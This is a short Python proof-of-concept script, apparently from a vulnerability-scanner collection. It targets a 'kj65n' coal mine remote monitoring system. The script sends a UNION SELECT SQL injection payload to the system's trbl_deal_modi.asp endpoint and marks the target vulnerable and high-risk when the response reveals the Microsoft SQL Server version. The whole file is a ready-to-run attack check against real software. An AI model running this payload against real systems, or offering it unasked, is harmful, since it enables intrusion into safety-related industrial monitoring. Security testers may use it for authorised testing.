#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: kj65n煤矿远程监控系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0148855
author: Lucifer
description: 
'''
import sys
import requests



class kj65n_monitor_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/yhpc/trbl_deal_modi.asp?pActFlag=MODIFY&pId=-7653%27%20UnIoN%20AlL%20SeLeCt%20NuLL,NuLL,NuLL,NuLL,@@version,NuLL,NuLL,NuLL,NuLL,NuLL--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"Microsoft SQL Server" in req.text:
                return "[+]存在kj65n煤矿远程监控系统SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = kj65n_monitor_sqli_BaseVerify(sys.argv[1])
    testVuln.run()